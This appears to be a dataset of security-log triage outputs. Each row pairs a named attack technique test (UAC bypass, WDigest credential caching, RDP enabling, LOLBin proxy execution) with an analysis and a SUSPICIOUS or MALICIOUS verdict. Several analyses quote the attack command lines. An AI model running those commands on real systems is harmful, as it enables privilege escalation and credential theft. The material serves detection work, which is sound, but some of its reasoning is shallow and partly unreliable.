   - Multiple processes including potentially benign commands like `hostname.exe` and `whoami.exe` are running at high integrity levels. Typically, operations running at such privileged levels might attempt privilege escalation. 

4. **Edge Update Executables**:
   - See several Edge Update related processes executing in succession and with different parameters, which appear benign if they were indeed for the legitimate updating of the browser.
   - Additionally, different EdgeUpdate versions were observed. If these processes reflect a genuine product cycle of updates, they can be considered legitimate.

5. **Security Software State**:
   - There are two mentions of Windows Defender being in `SECURITY_PRODUCT_STATE_ON` state, suggesting it was active during these events. This hints that the security perimeter is in place but needs reviewing if potentially malicious scripts attempted to evade detection.

### Assessment:

The patterns identified above do not conclusively indicate a confirmed compromise or breach (malicious activity), but certain activities stand out as potentially suspicious. The key areas for concern include frequent `wevtutil.exe` use and suspicious `cmd.exe` commands involving `hh.exe`. These areas prompt further investigation to rule out any hidden malicious aspects such as log manipulation or concealed payloads.

### Resolution:

Based on the analysis of the logs, the activity is marked as:
- **SUSPICIOUS**. 

### Recommendations:

1. **Deep Dive into PowerShell**:
   - Since PowerShell usage was logged, reviewing the detailed PowerShell logs would provide further insights into what scripts, if any, were run.

2. **Inspect .chm File**:
   - Manually verify the contents of the `data.001.chm` to ensure it does not contain embedded scripts or binaries that are harmful.

3. **User Activity Verification**:
   - Validate user `admin_test` activities. Ensure legitimate actions and monitor any unusual patterns or logon attempts around the time these logs were generated.

4. **Update and Harden Security**:
   - Check Windows Defender for anomaly reports or failures to detect unusual file or script behavior.

5. **Edge Update Confirmation**:
   - Confirm with the IT team regarding the Microsoft Edge update schedules to ensure the logged entries correlate with expected behavior.

In conclusion, while there is no direct evidence confirming a threat, the context necessitates a closer look to ensure there is no underlying compromise."
Setting Shadow key in Registry for RDP Shadowing,"## Detailed Analysis:

1. **Security Log Events:**
   - **Event ID 4634 (Logoff):** Indicates an admin user (`admin_test`) logged off. This is standard behavior and not inherently suspicious.
   - **Event ID 4672 (Admin Privileges):** The same admin user received special privileges like `SeDebugPrivilege` and others typically used by administrators to perform high-level tasks. While expected in certain scenarios, this could be a concern if not aligned with routine operations.
   - **Event ID 4624 (Logon):** The same account logged in using NTLM from a remote machine (`DESKTOP-3HL5B2P`). Although NTLM is less secure and might be a point of interest, its use is not necessarily malicious; it depends on the network configuration and policy.

2. **Sysmon Log Events:**
   - Numerous executions of `wevtutil.exe` and `conhost.exe`, which are legitimate system binaries but their frequent use raises questions about intent, potentially indicative of log manipulation or excessive console operations.
   - The execution of `HOSTNAME.EXE` and `whoami.exe` are normal commands used to fetch system details and might not be particularly suspicious unless executed in an odd pattern or without reason.
   - The execution of `powershell.exe` is critical, as it contains a complex command aimed at enabling a Remote Desktop rule and setting registry values. The command specifically involves allowing remote monitoring/shadowing capabilities, which could be a method employed to enable or maintain persistence or unauthorized access.

3. **Windows PowerShell Log:**
   - Reaffirms the Sysmon log finding where a PowerShell session ran a script with elevated privileges to modify firewall rules and registry keys related to remote management.

4. **Application Log:**
   - Notes the stopping of a service related to Microsoft Edge Update, which is routine and not directly linked to suspicious activities.

5. **System Log:**
   - No events provided for analysis, hence no impact on the outcome.

## Conclusion:

The logs reveal:
- Elevated privileges usage by `admin_test` which aligns with potentially necessary administrative tasks but given its timing, should be correlated with a known maintenance window.
- The PowerShell script execution significantly alters the system state to facilitate remote desktop sessions and shadowing, often a red flag pointing towards preparation for lateral movement or persistent backdoor creation.

Given these findings, the resolution is **SUSPICIOUS**. The behavior, especially the PowerShell activity, merits further investigation to confirm if legitimate administrative tasks were being performed or if these changes were unauthorized. Steps should include verifying with the IT/administration team about known activities, checking for any recent IT helpdesk requests or tasks, and possibly conducting a more extensive forensic analysis of the host for other malicious indicators or unauthorized access stipulations."
UAC Bypass with WSReset Registry Modification,"Upon analyzing the provided Windows event logs, several indicators point towards potential malicious activity:

### Analysis:

1. **Windows PowerShell Logs:**
   - **Command Execution Pattern**:
     - The command line in the PowerShell logs indicates the creation of a registry key that points to a command execution (`cmd.exe /c start cmd.exe`). This pattern is typically associated with registry hijacking or persistence mechanisms.
     - The sequence of operations includes setting an empty `""DelegateExecute""` property and modifying the `(default)` property to launch `cmd.exe` implicitly suggests a privilege escalation or persistence technique being planted into the system.
     - `WSReset.exe` being used with hidden window style (`-WindowStyle Hidden`) is suspicious. While `WSReset.exe` is commonly used to reset the Windows Store, its usage here is part of a PowerShell script which seems designed to obscure its true intent.

2. **Security and System Logs:**
   - **Events 4634 (Logoff) and 4624 (Logon)**:
     - The logon with privileges such as `SeDebugPrivilege` and `SeTakeOwnershipPrivilege` for a user named `admin_test` appears suspicious if this activity is not part of regular administrative tasks. These privileges can be misused for system exploitation.
   - **Repeated usage of wevtutil.exe and conhost.exe**:
     - These processes are frequently associated with administrative tasks and process management, but their frequent appearance in conjunction with each other, especially as a pattern, could indicate an attempt to manipulate event logs, possibly to hide tracks.

3. **Sysmon Logs:**
   - **Process Creation Patterns**:
     - `powershell.exe` executing a script that adjusts registry settings and with command-line arguments as detailed suggests unauthorized system configuration modifications.
   - **Process Execution by admin_test**:
     - The scripts executed by the user account `admin_test` demonstrate an execution pattern that is not typical for normal user behavior.

4. **Application Logs:**
   - **Windows Defender State**:
     - The logs consistently show Windows Defender is on, indicating that there is some level of protection. However, given the other activities, there might be attempts to bypass security mechanisms.

### Assessment:
The logs exhibit behaviors synonymous with tactics applied in persistence, privilege escalation, and potential evasion techniques using PowerShell scripts, which represent common steps in attack methodologies such as those used by adversaries looking to establish a foothold or further exploit a system. The use of PowerShell to create registry keys indicative of persistence mechanisms, combined with high-privilege account activities and process execution patterns, strongly suggests a security compromise.

### Recommendation:
- **Immediate Action**:
  - Proceed to further investigate the origin and intent of the scripts executed via PowerShell, traceability of any changes, and verify the `admin_test` account’s legitimacy and activity history.
  - Check for any unauthorized scheduled tasks or services that may have been set to run these scripts or others like it.
- **System Isolation**:
  - Consider isolating the affected system, `Server002`, from the network to prevent potential lateral movement while the investigation proceeds.
- **Review and Remediation**:
  - Conduct a thorough review of all administrative accounts and privileges.
  - Assess and remediate registry entries, particularly those modified during the PowerShell events.

**Resolution: MALICIOUS**
The log entries contain evidence of activity that aligns with known mal-intent patterns, indicating a likely compromise that necessitates immediate further investigation and remediation."
Regsvcs Uninstall Method Call Test,"## Detailed Analysis

### Suspicious or Anomalous Behavior

1. **PowerShell Activity**:
   - There is a suspicious PowerShell execution recorded, with commands aimed at executing a script that involves Base64 decoding to retrieve a key, executing `csc.exe` (C# compiler), and using `regsvcs.exe`. This activity could indicate an attempt to compile and register malicious code on the system.
   - This kind of activity aligns with behaviors typically observed in malware execution. The usage of PowerShell, Base64 encoded data, and compiling code on the fly are red flags often associated with malicious scripts or payloads delivery.

2. **Elevated Privileges and Privilege Escalation**:
   - There are several events showing successful logons (Event ID 4624) with elevated privileges (Event ID 4672), indicating SYSTEM-level activities. While SYSTEM accounts appearing in logs aren't necessarily indicative of malicious behavior, seeing it alongside potentially malicious activity could indicate a larger issue. 

3. **Combined COM Event Log Messages**:
   - Event ID 5888 paired with the COM+ application changes notably by user `admin_test` may signify changes in the COM objects which could be a vector for persistence or privilege escalation. It's worth noting this aligns temporally with the PowerShell activity.

4. **System and Service Interaction**:
   - `Process Creation` logs show several instances of typical system services being manipulated or queried, which may hint at reconnaissance or preparation phases of an attack. For instance, `whoami.exe` and `HOSTNAME.EXE` are frequently used in scripts gathering system information.

5. **Application Interaction**:
   - The logs show several interactions with `MicrosoftEdgeUpdate*.exe`. This could be normal operating behavior, or these binary paths could potentially be exploited for persistent hooks if malicious setup were in operation.

### Indicators of Malicious Activity or Compromise

1. **PowerShell Abuse**:
   - The sophisticated use of PowerShell with encoded commands is a strong indicator of a script-based attack, possibly delivering or deploying a payload on the target system. This is commonly used in APT (Advanced Persistent Threat) or sophisticated threat actors who rely on living-off-the-land techniques by using host binaries for executing their code.

2. **Evidence of Code Compiling and Registration**:
    - The use of `csc.exe` to compile DLLs from `.cs` files and register them via `regsvcs.exe` is uncommon for typical user applications and could imply an attempt to run specific scripts/programs designed to exploit a part of the system.

3. **Role and Com+ Modification**:
    - Unexplained modifications to COM+ roles and properties indicative of persistence methods, where these modifications might not align with expected administrative changes or tasks.

### Resolution

- **Resolution:** MALICIOUS

### Guidance and Next Steps

1. **Immediate Containment**:
   - Isolate the affected host from the network to prevent further spread or data exfiltration.
   - Consider running a thorough virus/malware scan using up-to-date definitions specifically targeting PowerShell-based malicious activities.

5. **User Awareness and Training**:
   - Educate users on the risks associated with script execution, specifically emphasizing caution regarding unexpected script files or items requiring immediate execution, especially those involving encoded payloads."
Rundll32 with desk.cpl,"Upon analyzing the provided Windows event logs, the following points of interest and potential indicators of malicious activities were identified:

### System and Time Manipulation:
- **Security Event Log (Event ID 4616):** There are logs showing changes of system time, particularly from ""2024-10-26 16:43:49.4235777"" to ""2024-10-26 16:43:45.1112417"". Time manipulation can be indicative of attempts to evade timestamp-based forensic analysis or to alter logs.

### Process Execution:
- **Sysmon Event Log (Event ID 1):** The execution of `cmd.exe` with the command line `""cmd.exe"" /c copy %windir%\System32\calc.exe not_an_scr.scr & rundll32.exe desk.cpl,InstallScreenSaver not_an_scr.scr` is highly suspicious. This command is attempting to masquerade `calc.exe` as a screensaver file (`not_an_scr.scr`) and execute it using Rundll32. This behavior is consistent with tactics used to persist or execute malicious payloads.

- **Sysmon Event Log (Event ID 1):** The presence of `whoami.exe` and `hostname.exe` being executed from a user directory with a high integrity level also raises questions about the actions being taken by the `admin_test` account.

### Privilege Use:
- **Security Event Log (Event ID 4672):** Privileges such as `SeDebugPrivilege` and `SeImpersonatePrivilege` being assigned to `admin_test` could be abused for lateral movement, privilege escalation, or execution of malicious code under elevated context.

### Network Observations:
- **Security Event Log (Event ID 4624):** There are multiple logins from the `admin_test` account, with one of them from a remote IP address `fe80::e3b5:5371:12a8:9c77`. Remote logins should be closely monitored, particularly for privileged accounts.

### Assessment and Conclusion:
- The event logs show evidence of process execution and command-line actions that are typically associated with malicious activity. The suspicious renaming and execution of `calc.exe` suggests potential compromise.
- Privilege grants and system time manipulation further support the hypothesis of advanced persistence or stealth tactics being employed on the system.
- There are multiple indicators that suggest further investigation is necessary to assess the extent and impact of this activity.

**Resolution: MALICIOUS**

### Guidance on How to Proceed:
1. **Immediate Isolation:** Consider isolating the affected system to prevent potential lateral movement or further compromise.
2. **Forensic Analysis:** Conduct in-depth forensic analysis on the machine to uncover additional artifacts and gather evidence.
3. **Review Privileges:** Audit the privileges for `admin_test` and similar high-privilege accounts. Ensure that privileges are appropriately assigned based on roles.
4. **Implement Monitoring:** Enhance monitoring for unusual activity on critical accounts and systems, focusing on privilege use, time changes, and remote logins.
5. **Patch and Update:** Ensure that all systems are up to date with the latest security patches and updates, reducing vulnerabilities.
6. **User Education:** Inform users about secure practices to prevent misuse of privileges and social engineering attacks.

Further analysis of network traffic and user behavior is recommended to determine if there are broader implications or additional compromised systems."
Enable RDP via Registry (fDenyTSConnections),"Based on the provided logs, here's a detailed analysis:

1. **Application Log:**
   - The events show entries related to the EdgeUpdate service starting and stopping, which are typical activities with no evidence of unusual or malicious activity.

2. **System Log:**
   - There is a change in system time, which is recorded multiple times. Although changing system time can sometimes be involved in evading detection, it is not always indicative of malicious intent, particularly if it aligns with legitimate maintenance activities or server synchronization processes.

3. **Security Log:**
   - The log shows regular logon sessions and activity from well-known system processes (like `services.exe`), involving typical system-level privileges.
   - Events 4624 (logon) and 4672 (special privileges assigned) are typical for system processes, such as when services start or execute.

4. **Sysmon Log:**
   - A significant point of interest is that multiple `wevtutil.exe` executions are observed. `wevtutil.exe` is a legitimate Windows utility for managing event logs. However, if misused, it could be used to delete logs or export them for exfiltration.
   - The sequence of executed processes includes `cmd.exe` with a command (`reg add`), which disables restrictions on remote connections (""fDenyTSConnections""). This action indicates an attempt to allow remote desktop connections, which can sometimes be associated with unauthorized access preparations.
   - The normal context shows Microsoft Edge updates and maintenance-related processes, which are typical and expected.

**Assessment of the Situation:**

- The sequence where `cmd.exe` executes a registry modification to allow RDP connections stands out as potentially suspicious activity, especially given it's performed under the context of a user account (`admin_test`) and not a recognized system update process.
- While activities involving `wevtutil.exe` could be malicious if used to clear logs, there is no sufficient evidence in these logs confirming their misuse in this context.

**Resolution:**

- **Resolution: SUSPICIOUS**

Given the context of the command (`reg add` via `cmd.exe`) being executed potentially to allow unauthorized remote connections, it warrants further investigation to clarify its intent, verify the legitimacy of the user action, and check for any potential security misconfigurations or unauthorized access attempts.

**Guidance on How to Proceed:**

1. **Network Access Review**: Check network logs for any unusual remote access attempts around the time of the `cmd.exe` event, focusing on any access from unknown external IP addresses.
2. **User Activity Verification**: Confirm with the user or responsible personnel `admin_test` regarding the command executed to ensure its legitimacy.
3. **System Configuration Audit**: Review system configurations for any unauthorized changes, focusing on RDP settings and event logs.
4. **Monitor Future Activity**: Increase monitoring on `wevtutil.exe` and other administrative tools for unusual or excessive usage patterns.
5. **Comprehensive Threat Hunt**: Conduct a detailed threat hunt across the system for other indicators of compromise or persistence mechanisms.

Further action should follow the standard incident response procedure, factoring in any findings from these steps."
Indirect Command Execution - forfiles.exe,"Upon reviewing the provided logs, I have identified several events that warrant attention and further investigation, as they may indicate potentially malicious or suspicious activity. 

1. **Suspicious Command Execution**:
   - There is a suspicious command executed via the `cmd.exe` process. The command line args are: `""cmd.exe"" /c forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe`. This command appears to be using `forfiles` to perform an action on `notepad.exe`, but it executes `calc.exe` instead. This kind of execution is often used for obfuscating malicious activities, leveraging harmless-looking processes like `calc.exe`.

2. **Process Hierarchies**:
   - Multiple processes like `whoami.exe`, `hostname.exe`, `cmd.exe`, and subsequently `calc.exe` were executed under the context of the user `SERVER002\\admin_test` from the path `C:\\Windows\\System32`. The `wevtutil.exe` was also frequently executed by this user. While these may not be inherently malicious, the pattern and timing in close succession are suspicious and should be investigated for potential abuse by an adversary.

3. **Windows Event Log Manipulation**:
   - The frequent execution of `wevtutil.exe` by a non-system user is unusual. `wevtutil.exe` is a command-line tool that could be used to manage event logs, including clearing them. An adversary with administrative privileges might use `wevtutil.exe` to tamper with event logs to erase traces of their activity.

4. **EdgeUpdate Related Events**:
   - Frequent starting and stopping of `MicrosoftEdgeUpdate.exe` services seem benign as they could relate to regular updates. However, in conjunction with other activities, it's worth verifying that no unusual modifications or unauthorized installations occurred.

5. **Multiple High Integrity Commands**:
   - Applications executed with high integrity level, such as `whoami.exe` and `hostname.exe`, may indicate privilege escalation attempts or reconnaissance within the system.

6. **Absence of PowerShell Logs**:
   - PowerShell is often used by attackers for scripting and process automation. The absence of logs might indicate the deletion of records, requiring a thorough check for PowerShell scripts executed around the event times.

**Assessment**:
Given the command execution patterns, questionable usage of standard administrative tools like `wevtutil`, and the lack of PowerShell logs, the evaluation of this situation leans towards being potentially problematic, requiring further investigation.

**Resolution**: **SUSPICIOUS**

**Recommended Actions**:
- Conduct an in-depth forensic analysis, focusing on the timeline of events in the `Sysmon` and `Security` logs.
- Verify user activities, especially for `SERVER002\\admin_test`, to ensure it aligns with legitimate business operations.
- Check the integrity of security logs and ensure no log tampering has occurred.
- Examine the system for any unauthorized software or changes, particularly `MicrosoftEdgeUpdate.exe` entries.
- Consider network traffic monitoring to detect any unusual outbound communications that may indicate data exfiltration."
System Scope COR_PROFILER,"Upon analyzing the provided logs, the following observations are made:

1. **PowerShell Activity:** There are multiple PowerShell events where system environment variables are being set with suspicious values. The environment variables `COR_ENABLE_PROFILING`, `COR_PROFILER`, and `COR_PROFILER_PATH` are especially concerning due to their usage in configuring .NET applications under a profiler, which is often considered a method used for malicious activity such as injecting malicious .NET assemblies.

   - The key point of interest is the PowerShell script executing these changes, suggesting an attempt to modify the environment of the system or applications for potentially unauthorized purposes.
   - The DLL referenced in `COR_PROFILER_PATH` (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.012\\bin\\data.012x64.dll`) is being set forcefully, indicating behavior that might be attempting to evade detection.

2. **Sysmon Logs:** 
   - We observe the use of `wevtutil.exe`, a legitimate Microsoft utility, to possibly clear event logs or extract information, paired with `conhost.exe` operations, which could indicate the concealment of actions. 
   - The sequence of processes leading to the execution of `hostname.exe` and `whoami.exe`, both of which are typical utility tools, might suggest investigative actions by an attacker to gather system and user information.

3. **Repetitive Microsoft Edge Update Activity:**
   - A seemingly legitimate activity involving Microsoft Edge Update processes, but it is noteworthy due to the volume of execution and the pathways (e.g., `C:\Program Files (x86)\Microsoft\Temp...`), which might indicate a hijacked or exploited update process.
   - The processes are being triggered under the `NT AUTHORITY\SYSTEM`, suggesting that the execution is occurring at a high integrity level.

4. **Elevation of Privileges Consideration:**
   - The use of scripting and updating mechanisms seems to be performed under administrative privileges, as suggested by the `High` integrity level and `NT AUTHORITY\SYSTEM` user context.

**Assessment:**
- The logs indicate potential malicious activity. The PowerShell script's operations to set suspicious environment variables are particularly alarming as it can be a method to influence application behavior or load unauthorized modules. The Sysmon logs suggest techniques that could be used for persistence, data gathering, or cleanup activities by an adversary.

**Resolution: MALICIOUS**
- The evidence of suspicious PowerShell usage to manipulate environment variables along with the administrative processes related to Microsoft Edge updates being executed in unusual directories and contexts, strongly suggest malicious intent.
  
**Guidance:**
- Immediate action should include isolating the affected system (Server002) to prevent further potential spread.
- Conduct a deeper forensic investigation, focusing on the files mentioned in the PowerShell logs, particularly the DLL file path.
- Review network activity related to this host for any anomalies or data exfiltration attempts.
- Consider resetting all system variables that have been modified and verify system and application integrity through trusted sources.
- Implement additional monitoring on similar systems to preemptively detect similar behavior."
WMI Win32_Product Class - Execute Local MSI file with embedded JScript,"### Detailed Analysis of the Logs

Upon reviewing the provided logs, the focus is primarily on detecting unusual or potentially malicious behavior, such as unexpected process executions, suspicious command-line arguments, or any activities that imply privilege escalation attempts.

#### PowerShell Log Analysis
- **PowerShell Execution:** Multiple entries show the execution of `powershell.exe` with the command:
  ```
  Invoke-CimMethod -ClassName Win32_Product -MethodName Install -Arguments @{ PackageLocation = 'C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.007\bin\data.007_JScript.msi' }
  ```
  This indicates an attempt to install a package using PowerShell, pointing to a potentially suspicious MSI file located in a temporary directory. Such directories are often used by malware for downloading and executing files, which suggests the need for further scrutiny.

#### System Log Analysis
- **Time Changes:** There are several entries indicating time changes managed by `svchost.exe`. Although time manipulation can be indicative of malicious activity (e.g., attempts to hide traces), this alone is not sufficient to label the activity as explicitly malicious without further corroborative evidence.

#### Application Log Analysis
- **MsiInstaller Events:** Logs show interaction with the same MSI package:
  ```
  C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.007\bin\data.007_JScript.msi
  ```
  Installation attempts from temporary directories are unusual unless the installation process is confirmed and expected. Given the directory and file name structure, this should be investigated for potential malware delivery.

#### Sysmon Log Analysis
- **Process Executions:** Numerous Sysmon logs indicate the PowerShell activity we saw earlier, as well as operations involving `MicrosoftEdgeUpdate.exe`. Although legitimate, Edge Update processes can be leveraged by attackers if compromised.
- **High Integrity Process Execution:** The use of `wsmprovhost.exe` as a parent process for several PowerShell executions under a high integrity level indicates the possibility of elevation privileges being exploited. This can often be a sign of an attacker attempting to maintain persistence or escalate privileges.

#### Security Log Analysis
- **Security Events:** The security logs show modification of system time-related entries. Although this can be benign, it should be considered in conjunction with other indicators.

### Situation Assessment and Recommendations
1. **Suspicious Indicators:**
   - The execution of an MSI installer from a temporary location via PowerShell suggests potentially unauthorized software installation.
   - High integrity level execution context and unusual parent-child process relationships warrant closer inspection for privilege escalation attempts.

2. **Threats Identified:**
   - Potential malware delivery through the enumerated MSI file using PowerShell.
   - Possible misuse of legitimate system tools (like PowerShell and WMI) for unauthorized or malicious purposes.

3. **Recommendations:**
   - **Immediate Quarantine:** Consider isolating the host to prevent potential lateral movement or further compromise.
   - **File Analysis:** Perform a detailed analysis of the MSI file located at `C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.007\bin\data.007_JScript.msi`.
   - **Review Privileges:** Audit user permissions and assess for any unauthorized privilege escalations.
   - **Threat Hunting:** Conduct a thorough investigation on the network to detect any further indications of compromise or related activity.

### Resolution
- **Resolution:** SUSPICIOUS

The logs demonstrate activity that is out of the ordinary and suggests potential malicious behavior, particularly with the suspicious PowerShell execution and MSI file installation from a temp directory. Further investigation is critical to determining whether this is an intrusion attempt or a false positive."
Use Powershell to Modify registry to store logon credentials,"Upon analyzing the provided Windows event logs, several entries need to be highlighted as either suspicious or indicative of potential malicious activity:

### Key Observations:

1. **PowerShell Execution with Sensitive Registry Modification:**
   - **EventID 1 from Sysmon** shows PowerShell executing with the command line: 
     ```plaintext
     powershell.exe & {Set-ItemProperty -Force -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -Name 'UseLogonCredential' -Value '1' -ErrorAction Ignore}
     ```
   - **Windows PowerShell Log** also confirms this execution under EventID 600 and 400 with the same command `Set-ItemProperty`.

   **Significance:** This command enables WDigest credential caching which can be leveraged by attackers to retrieve user credentials in plaintext from memory post exploitation. It is a known tactic used in advanced persistent threats and credential dumping activities.

2. **Frequent Invocation of Windows Event Utility (wevtutil.exe):**
   - Multiple logged events show the execution of `wevtutil.exe` and `conhost.exe` by the user `SERVER002\admin_test`.
  
   **Significance:** Wevtutil is often used to query or manage event logs, including clearing them. Multiple executions in a short timeframe might indicate an attempt to tamper with or clear evidence from logs.

3. **Service and Executable Launches by SYSTEM User:**
   - Multiple launches of legitimate services and known executables such as `MicrosoftEdgeUpdate.exe` running as `NT AUTHORITY\SYSTEM`. 

   **Note:** Most of these entries appear associated with update processes for Microsoft Edge, typically benign if verified, but should still be correlated with expected update behavior for confirmation.

4. **Potential Time Manipulation:**
   - **EventID 4616** in the Security Log records a system time change, which can sometimes obfuscate actions by altering time-stamp trails. However, in this case, it seems linked to legitimate system time synchronization (not uncommon, but worth noting given the context).

### Assessment & Guidance:

- **SUSPICIOUS:**
  - Alerts involving PowerShell and registry manipulation warrant heightened scrutiny. The registry change related to `WDigest` suggests a step consistent with credential theft attacks. The presence of such commands in system logs should be promptly investigated to ascertain the intent and scope.
  - The repeated invocation of `wevtutil.exe`, especially with administrative privileges, suggests potential log tampering. Correlate these events with authorized administrative activities or system jobs to differentiate malicious usage.

### Immediate Actions:

1. **Investigate Approach:**
   - Conduct a full forensic analysis of the affected system to trace back the PowerShell execution and user actions associated with `admin_test`.
   - Verify whether the `admin_test` account's activities and privileges are consistent with organizational policy and investigate any anomalies.

2. **Remediation Measures:**
   - If unauthorized access or changes are confirmed, follow incident response protocols, potentially including credential resets, disabling the compromised account, and applying relevant Windows security updates or patches.

3. **Build Alerts:**
   - Configure alerts and logging for registry changes related to `SecurityProviders\WDigest`.

Given the combination of these findings, the resolution is **SUSPICIOUS**, as these logs indicate activities meriting further investigation to rule out malicious behavior."
Deobfuscate-Decode Files Or Information,"### Analysis of the Windows Event Logs

#### 1. **Event Logs Overview:**
- **Security Log**: Contains events related to user logon/logoff operations and special privilige assignments.
- **Sysmon Log**: Displays process creations, along with detailed command-line executions for auditing purposes.

#### 2. **Suspicious Activities Identified:**

- **Privilege Assignment (Event ID 4672)**:
  - The user `admin_test` is granted a range of high-level privileges including `SeSecurityPrivilege`, `SeBackupPrivilege`, `SeRestorePrivilege`, `SeTakeOwnershipPrivilege`, and `SeDebugPrivilege`. This excessive set of privileges can be an indication of privilege escalation.

- **Command Execution (Sysmon Event)**:
  - **Event ID 1** for `cmd.exe`: 
    - Utilizes `certutil.exe` for encoding and decoding an executable (`calc.exe`) into a temporary location. The `certutil` tool is often used for malicious purposes such as payload encoding and decoding in attack scenarios.

- **Process Execution (Sysmon Event)**:
  - **Repeated instances of `wevtutil.exe` and `conhost.exe`** are observed being executed in quick succession. While these tools (event viewer utility and console host) can be leveraged for normal administrative purposes, their use in scripts or rapid succession could be indicative of enumeration or log manipulation.

#### 3. **Potential Threats & Risks**:

- **Privilege Escalation Risk**:
  - The granting of extensive system privileges (`4672`) to `admin_test` can enable an adversary to further exploit the system or cover up tracks by altering system logs or files using these elevated privileges.

- **Encoded Payload Execution**:
  - The execution of `certutil.exe` for encoding/decoding is particularly concerning, as it suggests potential lateral movement or data staging/preparation for exfiltration.

#### 4. **Assessment & Resolution**:

Based on the analysis of logs provided:

- **Resolution**: **MALICIOUS**

The combination of unusual privilege assignments, command-line executions involving `certutil` for encoding/decoding, and rapid process executions are strong indicators of compromise or advanced persistent threat activity. Privileges like `SeDebugPrivilege` can allow kernel-level debugging access, all indications pointing towards potential malicious activities.

### Next Steps and Recommendations:

1. **Containment**: 
   - Isolate the affected host `Server002` to prevent potential lateral movement or data exfiltration.
   
2. **Forensic Analysis**:
   - Acquire and analyze memory images and artifacts from `Server002` for further forensic investigation.
   - Inspect for possible persistence mechanisms established by checking for abnormal scheduled tasks, autorun entries, or rogue services.

3. **Privileged Account Investigation**:
   - Investigate the `admin_test` account for indicators of unauthorized or suspicious activity.
   - Check account activity and consider changing credentials.

4. **Review Usage of Utility Tools**:
   - Scrutinize usage and scripts involving `certutil`, `wevtutil`, as they might be used for illicit activities.
   
5. **Security Incident Response**:
   - Alert the Incident Response Team to take timely actions according to the incident response plan.
   - Review and enhance EDR rules and SIEM detections to better catch similar suspicious patterns early. 

Prompt and coordinated actions will be crucial to mitigating risk and ensuring system integrity."
Lolbas ie4uinit.exe use as proxy,"Upon examining the provided Windows event logs, several observations can be made:

1. **Frequent Usage of PowerShell and Command-Line Tools**: The logs indicate multiple instances where system utility tools like `powershell.exe`, `conhost.exe`, `wevtutil.exe`, and other command-line utilities (e.g., `whoami.exe`, `cmd.exe`, `rundll32.exe`) were executed in rapid succession. Such behavior could indicate automated scripts or potentially malicious activity aiming to gather system information or modify system states without typical user interaction.

2. **Execution of `ie4uinit.exe`**: The command executed via `cmd.exe` involves copying `ie4uinit.exe` to a temporary directory and executing it with `-BaseSettings`, which can indicate attempts to configure or reset certain settings. This could be benign if tied to legitimate system or application updates, but could also be leveraged by malwares to make unauthorized changes or bypass security settings if unexpected.

3. **Suspicious Execution Contexts**: Several processes are executed under a high integrity level, including some system utilities which are typical but worth noting if running under users other than SYSTEM or Admins without known need.

4. **Microsoft Edge Update Processes**: The presence of multiple instances of Microsoft Edge update processes (`MicrosoftEdgeUpdate.exe`, `MicrosoftEdgeUpdateSetup_X86_*.exe`) is observed, which could imply a software update routine. However, the creation and execution of temporary files (e.g., `EUE68.tmp` directory) is worth scrutinizing to ensure these aren't masquerading processes for malicious downloads or executions.

5. **Security Log Analysis**:
   - `EventID 4624` and `4672` correspond to successful logons and special privilege assignments, primarily executing with SYSTEM privileges.
   - `EventID 4798` indicates querying user information.
   - Potential anomalies could surface if these sequences perpetrated by non-standard users or during low activity windows.

Based on these observations:

- **General Activity**: Much of the log activity appears system-oriented, with processes indicative of updates, system checks, or health/status services (e.g., Windows Update Verification, Compatibility Telemetry, etc.).
- **Potential Anomalies**: Rapid execution of system commands and scripts (e.g., through `cmd.exe`) in a short time frame raises flags for potential compromises or scripting attacks.
- **Lack of Direct Malicious Indicators**: No definitive malware execution or traditional malicious payload indicators (hash mismatches, unauthorized access) are observed.

**Conclusion**: 

After evaluating the logs, the resolution is **SUSPICIOUS**. The activities warrant further investigation to differentiate between legitimate system behaviors (like updates or scheduled tasks) or potential unauthorized activities driven by scripts or unexpected user actions. Continued monitoring and correlation with network and endpoint protection logs can help clarify intentions and origins."
Odbcconf.exe - Execute Arbitrary DLL,"Upon analyzing the Windows event logs, several key points and patterns emerge that are pertinent to assessing potential security risks associated with the activities on the machine in question.

1. **Use of `wevtutil.exe` and `odbcconf.exe`:**
   - The logs include several executions of `wevtutil.exe` (Event IDs: 17965, 17969, 17973), which is a legitimate Windows command-line utility used for event log management but can also be used by attackers to manipulate or clear event logs to cover tracks.
   - The `odbcconf.exe` command with the `REGSVR` option (Event IDs: 17991, 17993) is particularly suspicious. It indicates that a DLL file located in a temporary directory was registered, which is a known technique used by attackers to execute and persist malicious code.

2. **Command Execution:**
   - The execution of `cmd.exe` with parameters to run `odbcconf.exe` (Event ID: 17991) under the account `SERVER002\admin_test` indicates a high-level integrity operation potentially indicative of a malicious attempt to implant unauthorized applications or code via DLL registration.

3. **Other System Activities:**
   - Numerous benign processes were executed, including Microsoft update mechanisms (MicrosoftEdgeUpdate.exe) and associated registration helpers. These processes are typically routine, indicating standard system update activities.

4. **High Integrity Level of Processes:**
   - The processes such as `cmd.exe` and the command registration have been executed at a high integrity level. Such actions imply administrative privileges were utilized or available at that moment, which increases the potential impact of any malicious activities.

5. **Context of User Account:**
   - The account `SERVER002\admin_test` is consistently seen across the events performing actions requiring high-level privileges. This implies the possibility of an insider threat or compromise of privileged accounts.

6. **Absence of Certain Logs:**
   - Noticeably, there is little to no activity logged in the Security logs, which could suggest either a log misconfiguration or manipulation/cleaning activity, especially given the presence of `wevtutil.exe`.

**Assessment:**

Considering the execution of `wevtutil.exe` and the use of `cmd.exe` with `odbcconf.exe` to register a DLL from a temporary directory, there are definite indicators of potentially malicious activity. These actions align with common techniques used to maintain persistence or escalate privileges in an unauthorized manner.

**Resolution: SUSPICIOUS**

Based on the evidence above, I classify this activity as SUSPICIOUS. The use of `odbcconf.exe` with DLL registration from a non-standard directory could indicate an attempt to execute unauthorized actions or maintain persistence in the system. Further investigation is warranted, especially focusing on:

- Verifying the integrity and origin of the `data.dll` file and checking if it matches any known malicious indicators.
- Checking the system for any unauthorized policy changes or scheduled tasks that could indicate compromise.
- Conducting a review of other machines and logs for similar patterns of suspicious activity.
- Assessing the security of the `admin_test` account for any unauthorized access or compromises.

Immediate steps should be to isolate the system, if necessary, and conduct a deeper forensic analysis to determine the full scope and intent of the detected anomalies. Additionally, reviewing and strengthening the monitoring and alerting processes can prevent unnoticed irregularities in the future."
